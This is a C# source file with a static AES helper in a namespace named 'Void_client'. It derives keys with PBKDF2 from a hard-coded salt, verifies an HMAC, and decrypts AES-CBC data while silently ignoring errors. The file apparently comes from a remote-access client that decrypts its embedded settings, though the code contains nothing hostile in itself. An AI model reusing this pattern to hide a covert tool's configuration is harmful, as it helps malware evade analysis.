using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Void_client.Libs
{
    public static class AES
    {
        //sets the default key
        public static void SetDefaultKey(string key)
        {
            using (Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(key, Salt, 50000))
            {
                defaultKey = rfc2898DeriveBytes.GetBytes(16);
                defaultAuthKey = rfc2898DeriveBytes.GetBytes(64);
            }
        }

        public static string Decrypt(string input)
        {
            return Encoding.UTF8.GetString(Decrypt(Convert.FromBase64String(input)));
        }
        
        //decrypts the input
        public static byte[] Decrypt(byte[] input)
        {
            if (defaultKey == null || defaultKey.Length == 0)
            {
                throw new Exception("Key can not be empty.");
            }
            if (input == null || input.Length == 0)
            {
                throw new ArgumentException("Input can not be empty.");
            }
            byte[] array = new byte[0];
            try
            {
                using (MemoryStream memoryStream = new MemoryStream(input))
                {
                    using (AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider())
                    {
                        aesCryptoServiceProvider.KeySize = 128;
                        aesCryptoServiceProvider.BlockSize = 128;
                        aesCryptoServiceProvider.Mode = CipherMode.CBC;
                        aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
                        aesCryptoServiceProvider.Key = defaultKey;
                        using (HMACSHA256 hmacsha = new HMACSHA256(defaultAuthKey))
                        {
                            byte[] a = hmacsha.ComputeHash(memoryStream.ToArray(), 32, memoryStream.ToArray().Length - 32);
                            byte[] array2 = new byte[32];
                            memoryStream.Read(array2, 0, array2.Length);
                            if (!Cryptography.AreEqual(a, array2))
                            {
                                return array;
                            }
                        }
                        byte[] array3 = new byte[16];
                        memoryStream.Read(array3, 0, 16);
                        aesCryptoServiceProvider.IV = array3;
                        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aesCryptoServiceProvider.CreateDecryptor(), CryptoStreamMode.Read))
                        {
                            byte[] array4 = new byte[memoryStream.Length - 16L + 1L];
                            array = new byte[cryptoStream.Read(array4, 0, array4.Length)];
                            Buffer.BlockCopy(array4, 0, array, 0, array.Length);
                        }
                    }
                }
            }
            catch { }
            return array;
        }
        
        private const int IvLength = 16;
        
        private const int HmacSha256Length = 32;
        
        private static byte[] defaultKey;
        
        private static byte[] defaultAuthKey;
        
        public static readonly byte[] Salt = new byte[]
        {
            191,
            235,
            30,
            86,
            251,
            205,
            151,
            59,
            178,
            25,
            2,
            36,
            48,
            165,
            120,
            67,
            0,
            61,
            86,
            68,
            210,
            30,
            98,
            185,
            212,
            241,
            128,
            231,
            230,
            195,
            57,
            65
        };
    }
}
